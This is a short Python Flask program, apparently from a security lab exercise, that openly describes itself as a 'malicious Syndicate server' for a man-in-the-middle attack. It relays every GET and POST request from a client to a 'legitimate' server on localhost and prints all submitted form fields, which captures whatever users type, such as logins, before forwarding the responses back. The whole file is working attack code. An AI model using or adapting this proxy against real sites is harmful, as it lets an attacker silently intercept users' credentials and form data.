"""
The malicious Syndicate server for conducting the man-in-the-middle attack
"""
from flask import Flask, Response, redirect, url_for, request, session, abort, g
import requests
app = Flask(__name__)

# The url of the legitimate server
senate_server = "http://127.0.0.1:12345"
app.config.update(dict(
    DEBUG=False,
    SECRET_KEY='this_is_the_malicious_server'
))


@app.route('/', methods=["GET", "POST"])
def home():
    '''
    The base URL handles all the forwarding of requests from the client to the legitimate server
    '''
    # Behaviour for a POST request
    if request.method == 'POST':
        keys = [key for key in request.form]
        payload = {}
        for request_key in keys:
            payload[request_key] = request.form[request_key]
        print(payload)
        resp = requests.post(session['last_url'], data = payload)
    # Behaviour for a GET request
    else:
        # If this is the first request go to the base url of the legitimate server
        if session.get('last_url') is None:
            resp = requests.get(senate_server)
        else:
            resp = requests.get(session['last_url'])

    # Remember what URL to send the next request to
    session['last_url'] = resp.url
    # Forward the received response to the client
    return resp.text

if __name__ == "__main__":
    app.run(host='127.0.0.1', port=12346)




